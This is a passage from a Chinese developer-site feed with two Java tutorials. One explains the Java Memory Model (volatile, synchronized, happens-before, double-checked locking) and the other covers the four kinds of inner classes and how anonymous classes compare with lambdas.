指程序执行的顺序与代码编写的顺序一致。</li>
</ol>
<ul>
<li>原因：CPU 为优化性能会进行 <strong>指令重排序</strong>（单线程下不影响结果，但多线程下可能破坏依赖关系）。</li>
<li>例：​<code>​int a = 1; int b = 2;​</code>​ 可能被重排为 ​<code>​int b = 2; int a = 1;​</code>​，若另一个线程依赖 ​<code>​a​</code>​ 先赋值，则可能出错。</li>
<li>保证方式：​<code>​volatile​</code>​（禁止重排序）、​<code>​synchronized​</code>​、​<code>​final​</code>​，以及 ​<code>​happens-before​</code>​ 规则。</li>
</ul>
<h4 data-id="heading-1">二、JMM 的内存结构模型</h4>
<p>JMM 抽象了线程与内存的交互关系，将内存分为两类：</p>




















<table><thead><tr><th>内存类型</th><th>作用</th><th>访问方式</th></tr></thead><tbody><tr><td><strong>主内存</strong></td><td>存储所有线程共享的变量（实例变量、静态变量）</td><td>线程需通过工作内存间接访问</td></tr><tr><td><strong>工作内存</strong></td><td>每个线程独有的私有内存（CPU 缓存 + 寄存器）</td><td>线程直接读写，速度快</td></tr></tbody></table>
<h5 data-id="heading-2">线程操作变量的流程：</h5>
<ol>
<li>线程从主内存读取变量到工作内存（<strong>加载 load</strong>）；</li>
<li>线程在工作内存中修改变量（<strong>使用 use</strong>）；</li>
<li>修改后的变量写回主内存（<strong>存储 store</strong>）。</li>
</ol>
<p>⚠️ 问题：多线程并发时，若多个线程同时修改同一变量，可能出现“工作内存数据不一致”（如线程 A 修改变量后未写回，线程 B 仍读取旧值）。</p>
<h4 data-id="heading-3">三、JMM 的核心保障机制</h4>
<p>JMM 通过以下机制保证原子性、可见性和有序性：</p>
<h5 data-id="heading-4">1. ​<code>​volatile​</code>​ 关键字</h5>
<ul>
<li><strong>可见性</strong>：线程修改 ​<code>​volatile​</code>​ 变量后，会立即写回主内存；其他线程读取时，会强制从主内存加载最新值（ invalidate 本地缓存）。</li>
<li><strong>有序性</strong>：禁止 ​<code>​volatile​</code>​ 变量前后的指令重排序（通过内存屏障实现）。</li>
<li>❌ 不保证原子性：例 ​<code>​volatile int i = 0; i++​</code>​ 仍可能出现并发问题（需结合原子类或锁）。</li>
</ul>
<h5 data-id="heading-5">2. ​<code>​synchronized​</code>​ 关键字</h5>
<ul>
<li><strong>原子性</strong>：保证同步块内的操作是原子的（同一时间只有一个线程执行）。</li>
<li><strong>可见性</strong>：线程释放锁时，会将工作内存的修改写回主内存；线程获取锁时，会从主内存加载最新变量值。</li>
<li><strong>有序性</strong>：同步块内的指令禁止重排序（锁的获取和释放相当于内存屏障）。</li>
</ul>
<h5 data-id="heading-6">3. ​<code>​final​</code>​ 关键字</h5>
<ul>
<li><strong>可见性</strong>：​<code>​final​</code>​ 变量初始化后，其值不能被修改（基本类型）或引用不能被重新赋值（引用类型），且初始化完成后立即对其他线程可见（禁止重排序初始化过程）。</li>
<li>例：​<code>​final int a = 10;​</code>​ 其他线程读取 ​<code>​a​</code>​ 时，一定能看到 ​<code>​10​</code>​，不会出现“半初始化”状态。</li>
</ul>
<h5 data-id="heading-7">4. ​<code>​happens-before​</code>​ 规则（JMM 的核心）</h5>
<p>​<code>​happens-before​</code>​ 是 JMM 定义的 <strong>先行发生关系</strong>，用于判断多线程操作的可见性和有序性。若操作 A ​<code>​happens-before​</code>​ 操作 B，则 A 的结果对 B 可见，且 A 的执行顺序在 B 之前。</p>
<p>常用 ​<code>​happens-before​</code>​ 规则：</p>
<ol>
<li><strong>程序顺序规则</strong>：同一线程内，代码按编写顺序执行（前序操作 ​<code>​happens-before​</code>​ 后续操作）。</li>
<li><strong>volatile 规则</strong>：​<code>​volatile​</code>​ 变量的写操作 ​<code>​happens-before​</code>​ 后续的读操作。</li>
<li><strong>锁规则</strong>：锁的释放操作 ​<code>​happens-before​</code>​ 后续的获取锁操作。</li>
<li><strong>线程启动规则</strong>：​<code>​Thread.start()​</code>​ ​<code>​happens-before​</code>​ 线程内的任何操作。</li>
<li><strong>线程终止规则</strong>：线程内的所有操作 ​<code>​happens-before​</code>​ 线程的终止检测（如 ​<code>​Thread.join()​</code>​ 完成）。</li>
</ol>
<h4 data-id="heading-8">四、JMM 的实际应用场景</h4>
<p>JMM 是并发编程的基础，所有 Java 并发工具（如 ​<code>​ThreadPoolExecutor​</code>​、​<code>​ConcurrentHashMap​</code>​）都依赖 JMM 保证线程安全。</p>
<h5 data-id="heading-9">典型场景：</h5>
<ol>
<li><strong>状态标志位</strong>：用 ​<code>​volatile boolean flag​</code>​ 作为线程中断或状态切换的标志（保证可见性和有序性）。</li>
<li><strong>单例模式</strong>：双重检查锁单例（​<code>​volatile​</code>​ 禁止实例初始化的重排序，避免拿到“半初始化”对象）。</li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance; <span class="hljs-comment">// volatile 关键</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">getInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// 第一次检查</span>
            synchronized (Singleton.<span class="hljs-keyword">class</span>) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// 第二次检查</span>
                    instance = <span class="hljs-keyword">new</span> Singleton(); <span class="hljs-comment">// 禁止重排序</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<ol>
<li><strong>并发数据更新</strong>：用 ​<code>​synchronized​</code>​ 或 ​<code>​Lock​</code>​ 保证多线程更新共享变量的原子性和可见性。</li>
</ol>
<h4 data-id="heading-10">总结</h4>
<p>JMM 的核心是 <strong>解决多线程并发时的内存可见性、原子性和有序性问题</strong>，通过抽象主内存和工作内存的交互，以及 ​<code>​volatile​</code>​、​<code>​synchronized​</code>​、​<code>​final​</code>​ 和 ​<code>​happens-before​</code>​ 规则，为 Java 并发编程提供统一的内存模型规范。理解 JMM 是掌握并发编程的基础，也是面试中的高频考点。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Day15 | Java内部类详解]]></title>    <link>https://juejin.cn/post/7575533124878352411</link>    <guid>https://juejin.cn/post/7575533124878352411</guid>    <pubDate>2025-11-24T03:11:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575533124878352411" data-draft-id="7575742632333426738" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Day15 | Java内部类详解"/> <meta itemprop="keywords" content="后端,Java,Java EE"/> <meta itemprop="datePublished" content="2025-11-24T03:11:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="懒惰蜗牛"/> <meta itemprop="url" content="https://juejin.cn/user/615342556327752"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Day15 | Java内部类详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/615342556327752/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    懒惰蜗牛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:11:15.000Z" title="Mon Nov 24 2025 03:11:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"⇲"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none}.markdown-body ul li:before{content:"•";margin-right:4px;color:#3eaf7c}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、什么是内部类</h2>
<p>内部类是定义在另一个类内部的类，它可以直接访问外部类的所有成员（包括私有成员），是实现封装、回调和高内聚设计的核心语法。</p>
<p>Java里面不仅可以在文件里定义类，还可以在类里嵌套类，这种就是内部类。</p>
<p>这种设计主要是为了解决一些实际问题，比如：</p>
<p>某个类只为另一个类服务时，不暴露它的存在；</p>
<p>表达逻辑更紧耦的协作关系；</p>
<p>实现更优雅的回调、观察者、迭代器等模式；</p>
<p>代替多继承带来的复杂性。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 9:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"我是Outer"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showName</span><span class="hljs-params">()</span> {
            System.out.println(name);
        }
    }
}
</code></pre>
<p>上述案例中，Outer是定义的一个普通类，Inner是在Outer类中（类定义大括号内）定义的一个内部类。</p>
<p>编译项目（IDEA中使用快捷键Ctrl + F9）,然后找到对应字节码文件（.class）。</p>
<p>项目字节码文件输出路径一般在项目中有个默认路径，当然也可以自定义。</p>
<p>使用快捷键Ctrl + Shift + Alt + S打开项目结构--&gt;Compiler output设置的路径就是编译后文件所在路径：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03cf98ce1ff745799c312d9286e4ceb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=OFJjxjaY%2F5mM89azajWkeidvdec%3D" alt="" loading="lazy"/></p>
<p>然后根据包名，类名，找到对应的字节码文件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1aa44f7a2c23486b97ddae43baf000f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=Tyk2NBN1mOEg7UR1m4EE7EQioSU%3D" alt="" loading="lazy"/></p>
<p>可以看到两个字节码文件，Outer.class和Outer$Inner.class。</p>
<p>这种命名方式是编译器决定的。</p>
<p>注意下面这种形式并不是内部类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 9:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"我是Outer"</span>;
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> {
    
}
</code></pre>
<p>编译后的结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/989b0e011cac4706b890af5b377be0c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=AHUKKrxQouKY0Q%2B255QzDi2HVeY%3D" alt="" loading="lazy"/></p>
<p>这种形式只是在同一个源文件中定义了两个类，不存在嵌套的关系，相互独立。</p>
<h2 data-id="heading-1">二、四种内部类</h2>
<h3 data-id="heading-2">2.1 成员内部类</h3>
<p>第一章的案例其实就是成员内部类。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 9:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"我是Outer"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showName</span><span class="hljs-params">()</span> {
            System.out.println(name);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Outer</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer</span>();
        Outer.<span class="hljs-type">Inner</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> outer.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();
        inner.showName();
    }
}
</code></pre>
<p>Inner和Outer存在绑定关系，Inner可以访问外部类的所有成员，包括私有字段。</p>
<p>内部类编译后的文件名Outer$Inner.class。</p>
<blockquote>
<p>成员内部类持有外部类的引用，如果生命周期不一致，可能导致外部类无法被GC。</p>
</blockquote>
<h3 data-id="heading-3">2.2 静态内部类</h3>
<p>静态内部类不依赖外部类实例。</p>
<p>只能访问外部类的静态成员。</p>
<p>在集合框架中常见。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d46b27caf4e44a958750e8067b338766~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=vv7HnVtKiFWdH1IdGWnekOHjGx4%3D" alt="" loading="lazy"/></p>
<p>上图是HashMap的源代码，Node类就是HashMap中定义的一个静态内部类。</p>
<h3 data-id="heading-4">2.3 局部内部类</h3>
<p>局部内部类定义在方法里，作用域仅限方法内部。</p>
<p>可以访问方法里的final或effectively final变量。</p>
<p>用于封装临时的小逻辑块。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer2
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 10:12
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer2</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">great</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Greater</span> {
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHi</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"你好 "</span> + name);
            }
        }
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Greater</span>().sayHi();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Outer2</span> <span class="hljs-variable">outer2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer2</span>();
        outer2.great(<span class="hljs-string">"懒惰蜗牛"</span>);
    }
}
</code></pre>
<blockquote>
<p>Java 8+，方法参数/局部变量不需要显式加final，只要没被修改，编译器会隐式处理成final（effectively final）</p>
</blockquote>
<h3 data-id="heading-5">2.4 匿名内部类</h3>
<p>匿名内部类就是没有名字的内部类。</p>
<p>主要用于快速实现接口或抽象类。</p>
<p>在事件监听、线程创建等场景中常见。</p>
<p>匿名内部类不能有构造方法，也不能实现多个接口。</p>
<p>如果你写过线程相关的代码，你应该见过这段代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer3
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 10:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer3</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"跑线程任务"</span>);
            }
        };
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(task).start();
    }
}
</code></pre>
<p>其实这段代码中task的创建等价于：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnonymousRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"跑线程任务"</span>);
    }
}
<span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnonymousRunnable</span>();
</code></pre>
<p>上下一对比，可以看出，匿名内部类就是适用于快速创建线程任务且实现简单的场景。</p>
<p>单纯的创建一个简单的线程任务，我们没必要再去写个具体的类来实现Runnable接口，再创建对象。</p>
<p>在编译后的字节码文件中，会出现Outer3$1.class文件，该文件反编译后：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/259913d7e2444623b91505f59082e3f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=lZYNUcCXlE9pfag0cgGP0%2B5gbrc%3D" alt="" loading="lazy"/></p>
<p>其实就是等价代码的逻辑。</p>
<p>Java 8+引入Lambda表达式后，代码可以进一步简化成：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer3
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 10:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer3</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> () -&gt; System.out.println(<span class="hljs-string">"跑线程任务"</span>);
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(task).start();
    }
}
</code></pre>
<p>Lambda表达式的写法不会再出现Outer3$1.class这样的字节码。</p>
<p>匿名内部类的简单演进过程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cff8830d8004ce29e34e370ce4d7aca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=M7yxO1dkswv%2F9CjPgCKEpPT62nU%3D" alt="" loading="lazy"/></p>
<p>下面是Lambda表达式和匿名内部类的差异总结：</p>






































































<table><thead><tr><th>特性</th><th>Lambda表达式</th><th>匿名内部类</th></tr></thead><tbody><tr><td>本质</td><td>函数式接口的简洁实现</td><td>马上就创建类实例</td></tr><tr><td>语法结构</td><td>(params) -&gt; expression</td><td>new Interface() { 方法实现 }</td></tr><tr><td>编译机制</td><td>使用invokedynamic指令动态生成</td><td>生成独立.class文件（比如Outer3$1.class）</td></tr><tr><td>作用域</td><td>共享外围作用域</td><td>有独立作用域</td></tr><tr><td>this关键字</td><td>指向外围类实例</td><td>指向自身实例</td></tr><tr><td>变量捕获</td><td>可以捕获effectively final变量（隐式final）</td><td>需显式final变量</td></tr><tr><td>内存占用</td><td>较小（JVM级优化）</td><td>较大（生成新类）</td></tr><tr><td>方法支持</td><td>只能实现单个抽象方法</td><td>可实现多方法</td></tr><tr><td>构造函数</td><td>不支持</td><td>支持实例初始化块</td></tr><tr><td>接口类型</td><td>仅限函数式接口（单一抽象方法）</td><td>支持任意接口/抽象类</td></tr><tr><td>调试信息</td><td>栈轨迹更简洁</td><td>有完整类名（但匿名类名可读性差）</td></tr><tr><td>字节码验证</td><td>运行时校验</td><td>编译时校验</td></tr></tbody></table>
<h2 data-id="heading-6">结语</h2>
<p>内部类这种设计让类的定义不局限于文件或包，可以灵活嵌套，配合作用域、访问控制、编译策略，一起构建高内聚、低耦合的结构。</p>
<p>在真实项目开发里，要不要使用内部类，关键在于能不能提升代码的可读性与模块性。</p>
<p>不是所有内部类都值得保留，也不是所有逻辑都该外提成独立类。</p>
<p>如果你把内部类当成语法糖，那它就是个工具；</p>
<p>但如果你把它当作结构表达力的一部分，那它就是一种架构语言。</p>
<p><strong>下一篇预告</strong></p>
<blockquote>
<p>Day16 | Java异常机制详解</p>
</blockquote>
<p>如果你觉得这系列文章对你有帮助，欢迎关注专栏，我们一起坚持下去！</p>
